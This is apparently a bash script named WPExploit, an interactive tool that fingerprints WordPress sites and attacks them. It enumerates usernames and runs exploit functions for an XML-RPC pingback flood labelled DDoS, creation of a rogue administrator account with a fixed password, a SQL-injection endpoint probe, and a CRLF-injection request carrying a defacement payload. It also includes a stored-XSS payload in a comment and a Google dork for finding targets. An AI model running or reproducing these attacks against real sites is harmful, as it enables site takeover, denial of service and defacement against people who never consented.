#!/bin/bash
# WPExploit (IMPS)
# @autor: Henrique Bissoli Silva (emp.shad@gmail.com)
# Updates: https://github.com/Shadowz3n/WPExploit
# Google Dork: https://www.google.com/search?q="index of" inurl:wp-content/
# Reference Link: https://wpvulndb.com/wordpresses
# Reference Exploits: http://blog.cinu.pl/2015/11/php-static-code-analysis-vs-top-1000-wordpress-plugins.html

setaf1=`tput setaf 1`
setaf2=`tput setaf 2`
RED="\e[1m\e[91m"
BANNERT="\e[1m\e[5;32;40m"
INVERT="\e[7m"
BOLD=`tput bold`
BLINK="\e[5m"
NC=`tput sgr0 && tput setab 9`
VERSION='0.0.1'
HEADERS="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:42.0) Gecko/20100101 Firefox/42.0"

tput clear
exiting(){
	tput clear
	echo -e "${BOLD}Exiting..${NC}"
	exit 1
}
trap exiting SIGINT # Ctrl+C
trap exiting SIGQUIT # Terminate
trap exiting SIGTSTP # Ctrl+Z

helptxt(){
	echo -e "\t${BOLD}${BLINK}Options:${NC}"
	echo -e "\t${BOLD}   exit \t Finish${NC}"
	echo -e "\t${BOLD}   banner \t Show banner${NC}"
	echo -e "\t${BOLD}   help \t Show this message${NC}"
	echo -e "\t${BOLD}   enumerate \t Enumerate users${NC}"
	echo -e "\t${BOLD}   exploit \t Test all available exploits${NC}\n"
}

banner(){
	echo -e "\n\t${BANNERT}******************************************************************${NC}"
	echo -e "\t${BANNERT}*                                                                *${NC}"
	echo -e "\t${BANNERT}*                      WPExploit Version $VERSION                   *${NC}"
	echo -e "\t${BANNERT}*               Sponsored by IMPS - http://imps.pro              *${NC}"
	echo -e "\t${BANNERT}*                                                                *${NC}"
	echo -e "\t${BANNERT}******************************************************************${NC}\n\n"
	echo -e "\t${RED}${INVERT}[!]${NC} ${RED}legal disclaimer: Usage of wpexploit for attacking targets without prior mutual consent is illegal.\n\tIt is the end user's responsibility to obey all applicable local, state and federal laws.\n\tDevelopers assume no liability and are not responsible for any misuse or damage caused by this program${NC}\n"
}

setInterval(){
	local _start _end _delta _sleep
	while true; do
		_start=$(date +%s)
		"$1"
		_end=$(date +%s)
		_delta=$((_end - _start))
		_sleep=$(($2 - _delta))
		sleep "$_sleep"
	done
}

loading(){
	if [[ `tput lines` > 16 ]]; then
		tput civis
		tput cup $1 $2;echo -e "\t${BANNERT}Loading.   [/]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading.   [|]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading.   [\\]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading.   [/]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading..  [|]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading..  [\\]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading..  [/]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading..  [|]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading... [\\]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading... [|]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading... [/]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading... [|]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading... [\\]${NC}";sleep $3;
		tput cup $1 $2;echo -e "\t${BANNERT}Loading.   [|]${NC}";sleep $3;
		tput cup $1 $2;echo -e "                              "
		tput cuu1;tput cuu1;tput cnorm
	fi
}

banner
if [[ "$1" ]]; then
	url="${1##*\/\/}"
	url="${url%%\/*}"
	echo -e "\t${BOLD}URL: $1 ${NC}"
	if host $url &> /dev/null; then
	
		# WordPress Curl
		loading 15 0 0.05
		wpcurl=`curl -s -L -H "$HEADERS" "$1"`
		
		# If not WordPress
		if [[ $wpcurl != *"wp-includes"* && $wpcurl != *"wp-content"*  ]]; then
			echo -e "\t${RED}[The remote website is up, but does not seem to be running WordPress]\n${NC}"
			exit 1
		fi
		
		# Test XML-RPC
		if [[ $wpcurl == *"xmlrpc.php"* ]]; then
			echo -e "\t${BOLD}XML-RPC Interface available${NC}\n"
		else
			echo -e "\t${RED}[XML-RPC Interface is not available]${NC}\n"
		fi
		
		# WordPress Version By readme.html
		checkreadme=`curl -H "$HEADERS" -s -o "/dev/null" -w "%{http_code}" "$1/readme.html"`
		if [[ $checkreadme = '200' ]]; then
			wpcurl=`curl -s -L -H "$HEADERS" "$1/readme.html"`
			WPVS="${wpcurl##*<h1 id="logo">}"
			WPVS="${WPVS%%</h1>*}"
			WPVS="${WPVS##*<br />}"
			WPVS="${WPVS//[!.0-9]/}"
			WPV="${WPVS//[!0-9]/}"
			echo -e "\t${BOLD}WordPress Version: $WPVS\t(readme.html)${NC}\n"
		else
		
			# WordPress Version By generator tag
			if [[ $wpcurl == *content=\"WordPress\ * ]]; then
				WPVS=${wpcurl##*content=\"WordPress }
				WPVS="${WPVS%%\" />*}"
				WPVS="${WPVS//[!.0-9]/}"
				WPV="${WPVS//[!0-9]/}"
				echo -e "\t${BOLD}WordPress Version: $WPVS\t(Generator tag)${NC}\n"
			else
				WPV='0'
				echo -e "\t${RED}[Undefined WordPress Version]${NC}\n"
			fi
		fi
		
		# More than 3 Numbers on WordPress Version
		WPV=${WPV:0:3}
		
		# Less than 3 Numbers on WordPress Version
		if [[ $WPV > 0 && ${#WPV} < 3 ]]; then
			WPV=$WPV"0"
		fi
		
		# Exploits Array
		WPExploitArray=()
		
		_422(){
			
			# WordPress <= 4.2 Stored XSS
			echo -e "\t${BOLD}WordPress <= 4.2 Stored XSS [$2]${NC}"
			#<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
			echo -e "\t${RED}[Fail]${NC}\n"
		}
		WPExploitArray+=(422)
		
		_393(){
		
			# WordPress XML-RPC DDoS
			echo -e "\t${BOLD}WordPress XML-RPC DDoS [$2]${NC}"
			if [[ $WPV = "392" || $WPV = "384" || $WPV = "374" ]]; then
				read -p "${BOLD}DDoS ? [y/n]" ddos
				ddos=`echo $ddos | tr '[:upper:]' '[:lower:]'`
				if [[ $ddos = 'y' || $ddos = '' ]]; then
					echo -e "\t${BOLD}[DDoS On]${NC}\n"
					for i in {1..10}; do
						curl -s "$1/xmlrpc.php" -o "/dev/null" -d "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>$1</string></value></param><param><value><string>$1/postchosen</string></value></param></params></methodCall>"
						echo -e "\t${BOLD}[$i .. 10]${NC}"
					done
				else
					echo -e "\t${RED}[DDoS Off]${NC}\n"
				fi
			else
				echo -e "\t${RED}[Fail]${NC}\n"
			fi
		}
		WPExploitArray+=(393)
		
		_332(){
		
			# WordPress <= 3.3.1 Adding new admin
			echo -e "\t${BOLD}WordPress <= 3.3.1 Adding new admin [$2]${NC}"
			add_admin=`curl -H "$HEADERS" -s -o "/dev/null" -w "%{http_code}" "$1/wp-admin/user-new.php" -d "action=createuser&_wpnonce_create-user=<sniffed_value>&_wp_http_referer=%2Fwordpress%2Fwp-admin%2Fuser-new.php&user_login=admin2&email=admin2@admin.com&first_name=admin2@admin.com&last_name=&url=&pass1=password&pass2=password&role=administrator&createuser=Add+New+User+"`
			if [[ "$add_admin" = '200' ]]; then
				echo -e "\t${BOLD}Link: $1/wp-admin \n\tLogin: admin2 \n\tPass: password${NC}\n"
			else
				echo -e "\t${RED}[Fail]${NC}\n"
			fi
		}
		WPExploitArray+=(332)
		
		_315(){
			
			# Wordpress <= 3.1.5 WP RSS Multi Importer (SQL Injection)
			echo -e "\t${BOLD}WordPress <= 3.1.5 WP RSS Multi Importer (SQL Injection) [$2]${NC}"
			res=`curl -H "$HEADERS" -s "$1/wp-admin/admin-ajax.php?action=rssmi_fetch_items_now" --data "pid=1"`
			if [[ $res != '' && $res != '0' ]]; then
				echo -e "${BOLD}\tVuln${NC}\n"
			else
				echo -e "\t${RED}[Fail]${NC}\n"
			fi
		}
		WPExploitArray+=(315)
		
		_122(){
			
			# WordPress <= 1.2 Trying to login
			echo -e "\t${BOLD}Wordpress <= 1.2 Trying to login [$2]${NC}"
			login=`curl -H "$HEADERS" -s -o "/dev/null" -w "%{http_code}" "$1/?action=login&mode=profile&log=USER&pwd=PASS&text=%0d%0aConnection: Keep-Alive%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.0 200 OK%0d%0aContent-Length: 21%0d%0aContent-Type: text/html%0d%0a%0d%0a{html}*defaced*{/html} "`
			if [[ "$login" = '200' ]]; then
				echo -e "${BOLD}\tVuln${NC}\n"
			else
				echo -e "\t${RED}[Fail]${NC}\n"
			fi
		}
		WPExploitArray+=(122)
		
		# Shell
		helptxt
		while true; do
			tput bold
			read -p "${setaf2}WPExploit> ${NC}" shell
			shell=`echo $shell | tr '[:upper:]' '[:lower:]'`
			if [[ $shell = 'exit' ]]; then
			
				# Exit
				exiting
			elif [[ $shell = 'help' ]]; then
			
				# Show Help
				helptxt
			elif [[ $shell = 'banner' ]]; then
			
				# Show banner
				banner
			elif [[ $shell = 'enumerate' ]]; then
			
				# Enumerate Author Users
				echo -e "\n\t${BOLD}Enumerating usernames.. [1-5]${NC}"
				USERSC=''
				for i in {1..5}; do
					UInfo=`curl -H "$HEADERS" -s -L -i "$1/?author=$i" | grep -E -o "\" title=\"View all posts by [a-z0-9A-Z\-\.]*|Location:.*" | sed 's/\// /g' | cut -f 6 -d ' ' | grep -v "^$"`
					if [[ $UInfo != '' ]]; then
						echo -e "\t\t${BOLD}$UInfo${NC}"
						USERSC='1'
					fi
				done
				if [[ "$USERSC" = '' ]]; then
					echo -e "\t${BOLD}[!] Trying again${NC}\n"
					USERSC=''
					for i in {1..5}; do
						UInfo_=`curl -H "$HEADERS" -s -D - "$1/?author=$i"`
						UInfo="${UInfo_##*<title>}"
						UInfo="${UInfo##*&#8211; }"
						UInfo="${UInfo%%</title>*}"
						if [[ $UInfo != '' && $UInfo_ != *'id="searchsubmit"'* ]]; then
							echo -e "\t\t${BOLD}$UInfo${NC}"
							USERSC='1'
						fi
					done
					if [[ "$USERSC" = '' ]]; then
						echo -e "\t\t${RED}[It was not possible to enumerate users]${NC}\n"
					fi
				fi
			elif [[ $shell == *"exploit"* || $shell = 'run' ]]; then
			
				# Count exploits
				ExploitCount=0
				for e in ${WPExploitArray[@]}; do
					if [[ $WPV < $e ]]; then
						ExploitCount=$[$ExploitCount +1]
					fi
				done
			
				# Available exploits
				if [[ $ExploitCount > 0 ]]; then
					echo -e "\n\t${BOLD}Testing $ExploitCount exploit(s) for WordPress <= $WPVS${NC}\n"
					for e in $(seq 0 $((${#WPExploitArray[@]} - 1))); do
						if [[ $WPV < ${WPExploitArray[$e]} ]]; then
							_${WPExploitArray[$e]} $1 $[$e +1]
						fi
					done
				else
					echo -e "\n\t${RED}[No available exploits]${NC}\n"
				fi
			else
				tput clear
				echo -e "\n\t${RED}[Command not found]${NC}"
				helptxt
			fi
		done
		
		echo -e "\t${BOLD}WordPress Scan Done${NC}"
	else
		echo -e "\t${RED}[$url is down]${NC}"
	fi
else
	echo -e "\n\t${BOLD}Usage: bash $0 site.com${NC}\n"
fi
